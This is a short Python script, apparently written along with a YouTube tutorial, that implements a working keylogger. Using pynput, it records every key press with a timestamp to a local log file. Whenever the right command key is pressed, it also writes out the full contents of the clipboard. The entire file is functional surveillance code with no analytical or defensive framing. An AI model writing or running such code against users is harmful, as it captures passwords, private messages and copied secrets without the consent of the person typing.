# https://www.youtube.com/watch?v=OMEmtSAgReM
from pynput.keyboard import Listener # allows us to listen for keyboard events
from datetime import datetime
import pyperclip


OUTPUT_KEYS =  './logs/keys.log'


def logkeys(key):
     ''' when this function is called, the Listener will pass over a key variable,
        which is a key that the user has pressed
     '''
     key = str(key).replace("'", "") # stringify key object, remove single quotes
     line = None
     time = str(datetime.now()) # get the date/time of the line

    # get contents of the clipboard

     if key == 'Key.cmd_r': # if command key is pressed, get clipboard content
        line = f"{time}: Clipboard - {pyperclip.paste()}"

     else: # any other key
        line = f"{time}: Key Log - {key}"

    #write ouput to logs
     with open(OUTPUT_KEYS, 'a') as f:
        f.write(f"{line}\n")


def main():
    # logging users key presses
    with Listener(on_press=logkeys) as i:
        i.join()

if __name__ == '__main__':
    main()